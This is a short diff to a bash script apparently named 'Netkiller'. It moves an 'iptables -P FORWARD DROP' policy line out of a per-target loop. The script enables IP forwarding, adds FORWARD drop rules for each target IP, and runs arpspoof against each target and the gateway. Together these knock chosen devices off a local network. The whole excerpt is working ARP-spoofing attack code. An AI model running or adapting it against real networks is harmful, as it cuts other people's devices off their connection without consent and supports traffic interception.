@@ -73,6 +73,9 @@ for item in "${INPUT_ARRAY[@]}"; do
     fi
 done
 
+# Iptables policy
+iptables -P FORWARD DROP
+
 # Check if we have valid target IPs
 if [ ${#TARGET_IPS[@]} -eq 0 ]; then
     echo "No valid target IPs provided (device IP excluded)."
@@ -104,8 +107,8 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 # Run arpspoof for each target IP
 for TARGET_IP in "${TARGET_IPS[@]}"; do
     echo "Netkiller blocking the IP => $TARGET_IP"
+    
     # iptables rules 
-    iptables -P FORWARD DROP
     iptables -A FORWARD -s $TARGET_IP -j DROP
     iptables -A FORWARD -d $TARGET_IP -j DROP
     arpspoof -i "$INTERFACE" -t "$TARGET_IP" -r "$GATEWAY" >/dev/null 2>&1 &
